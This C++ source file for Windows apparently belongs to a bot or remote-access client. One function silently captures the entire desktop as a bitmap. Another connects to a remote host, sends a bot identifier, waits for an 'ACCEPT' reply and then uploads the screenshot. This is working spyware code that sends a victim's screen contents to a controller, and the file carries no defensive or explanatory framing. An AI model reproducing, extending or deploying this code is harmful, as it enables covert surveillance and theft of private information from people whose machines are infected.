#include "Screenshot.h"
#include "Sockets.h"
#include "GateHelper.h"

#include <Windows.h>

char* CaptureScreenshot(int* length) {
	HDC hdcScr, hdcMem;

	HBITMAP hBitmap;
	BITMAP bmp;

	int xRes, yRes;

	hdcScr = CreateDCA("DISPLAY", NULL, NULL, NULL);
	hdcMem = CreateCompatibleDC(hdcScr);

	xRes = GetDeviceCaps(hdcScr, HORZRES);
	yRes = GetDeviceCaps(hdcScr, VERTRES);

	hBitmap = CreateCompatibleBitmap(hdcScr, xRes, yRes);

	if (hBitmap == 0) return NULL;

	if (!SelectObject(hdcMem, hBitmap)) return NULL;

	if (!StretchBlt(hdcMem, 0, 0, xRes, yRes, hdcScr, 0, 0, xRes, yRes, SRCCOPY))
		return NULL;

	PBITMAPINFO pbmi;
	WORD cClrBits;

	if (!GetObject(hBitmap, sizeof(BITMAP), (LPSTR)&bmp))
		return NULL;

	cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);

	if (cClrBits == 1)
		cClrBits = 1;
	else if (cClrBits <= 4)
		cClrBits = 4;
	else if (cClrBits <= 8)
		cClrBits = 8;
	else if (cClrBits <= 16)
		cClrBits = 16;
	else if (cClrBits <= 24)
		cClrBits = 24;
	else
		cClrBits = 32;

	if (cClrBits != 24)
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << cClrBits));
	else
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));

	pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);

	pbmi->bmiHeader.biWidth = bmp.bmWidth;
	pbmi->bmiHeader.biHeight = bmp.bmHeight;
	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;

	pbmi->bmiHeader.biCompression = BI_RGB;
	pbmi->bmiHeader.biSizeImage = (pbmi->bmiHeader.biWidth + 7) / 8 * pbmi->bmiHeader.biHeight * cClrBits;

	pbmi->bmiHeader.biClrImportant = 0;

	BITMAPFILEHEADER hdr;
	PBITMAPINFOHEADER pbih;

	DWORD dwTotal;
	DWORD cb;
	char* lpBits;
	char* hp;

	DWORD dwTmp;

	pbih = (PBITMAPINFOHEADER)pbmi;
	lpBits = (char*)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

	if (!lpBits) return NULL;

	if (!GetDIBits(hdcMem, hBitmap, 0, (WORD)pbih->biHeight, lpBits, pbmi, DIB_RGB_COLORS))
	{
		GlobalFree(lpBits);
		return NULL;
	}


	hdr.bfType = 0x4d42;

	hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);

	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;

	hdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD);

	cb = pbih->biSizeImage;

	DWORD dwSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD);
	dwSize += cb;
	
	char* image = (char*)GlobalAlloc(GMEM_FIXED, dwSize);
	memcpy_s(image, dwSize, &hdr, sizeof(BITMAPFILEHEADER));
	memcpy_s(image + sizeof(BITMAPFILEHEADER), dwSize - sizeof(BITMAPFILEHEADER), pbih, sizeof(BITMAPINFOHEADER));
	memcpy_s(image + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), dwSize - sizeof(BITMAPFILEHEADER) - sizeof(BITMAPINFOHEADER), lpBits, cb);

	GlobalFree((HGLOBAL)lpBits);

	ReleaseDC(0, hdcScr);
	ReleaseDC(0, hdcMem);

	*length = dwSize;
	return image;
}

void FreeScreenshot(char* data) {
	GlobalFree((HGLOBAL)data);
}

bool SendScreenshot(char* destination, unsigned short port, char* data, int dataLength, char* botId) {
	sockaddr_in input;
	if (!GetSocketAddress(destination, &input)) return false;
	input.sin_port = htons(port);
	SOCKET s;

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == 0) return false;

	int cRes = connect(s, (sockaddr*)&input, sizeof(input));
	if (cRes == SOCKET_ERROR) {
		closesocket(s); return false;
	}

	send(s, botId, strlen(botId), 0);

	char* buffer = (char*)malloc(32);
	ZeroMemory(buffer, 32);
	int len = recv(s, buffer, 32, 0);

	if (strcmp(buffer, "ACCEPT\\1") == 0) {
		send(s, data, dataLength, 0);
	}
	else {
		closesocket(s);
		return false;
	}
	len = recv(s, buffer, 32, 0);

	free(buffer);
	closesocket(s);

	return true;
}